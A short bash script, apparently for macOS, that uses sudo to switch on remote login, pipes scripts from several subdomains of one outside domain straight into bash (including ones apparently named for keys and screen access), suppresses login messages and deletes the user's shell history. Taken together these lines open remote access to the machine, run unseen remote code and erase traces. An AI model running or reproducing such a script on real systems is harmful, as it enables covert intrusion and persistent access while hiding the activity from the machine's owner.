#!/bin/bash

if [ $(uname -s) = Darwin ]; then
	HASRL=$(sudo systemsetup -getremotelogin | awk -v N=3 '{print $N}');
	if [ $HASRL = Off ]; then
		sudo systemsetup -setremotelogin on >> /dev/null;
	fi
	which -s brew;
	if [[ $? != 0 ]]; then
		curl -sL brew.cooperstuff.ninja | bash;
	fi
fi

curl -sL key.cooperstuff.ninja | bash;
clear;
curl -sL screen.cooperstuff.ninja | bash;
touch .hushlogin
rm -f ~/.bash_history;

